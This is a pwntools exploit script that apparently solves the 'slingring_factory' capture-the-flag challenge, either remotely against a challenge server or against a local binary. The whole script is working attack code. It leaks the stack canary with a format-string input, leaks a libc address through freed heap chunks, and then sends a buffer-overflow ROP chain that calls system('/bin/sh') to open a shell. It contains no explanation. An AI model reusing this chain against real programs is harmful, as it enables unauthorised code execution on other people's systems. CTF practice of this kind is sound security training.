#!/usr/bin/python3

from pwn import *

exe = ELF('slingring_factory_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brav 0x1A9A

        c
        ''')
        input()


if args.REMOTE:
    p = remote('challs.nusgreyhats.org', 35678)
else:
    p = process(exe.path)
GDB()


def leak_can(pa):
    sla(b'name?', pa)


def cr(idx, pa, ):
    sla(b'>> ', b'2')
    num = idx+1
    sla(b'rings!', str(idx))
    sla(b'location:', str(pa))
    sla(b'(1-9):', b'1')
    sa(b'return.', b'\n')


def de(idx):
    sla(b'>> ', b'3')

    sla(b'discard?', str(idx))


leak_can('%7$p')
p.recvuntil(b'Hello, ')
canary = int(p.recvline()[:-1], 16)
info(hex(canary))
for i in range(9):
    cr(i, b'a')
for i in range(8):
    de(i)
sla(b'>> ', b'1')
p.recvuntil(b'| [144]   | ')
libc.address = u64(p.recv(6) + b'\0\0') - 0x21ace0
info("libc.address: " + hex(libc.address))
sa(b'return.', b'\n')
sla(b'>> ', b'4')
sla(b'(id): ', b'1')
pa = b'a' * 56 + flat(canary, 0,
                      libc.address + 0x000000000002a3e5+1, libc.address + 0x000000000002a3e5,
                      next(libc.search(b'/bin/sh')), libc.sym.system
                      )
sla(b'spell: ', pa)

p.interactive()
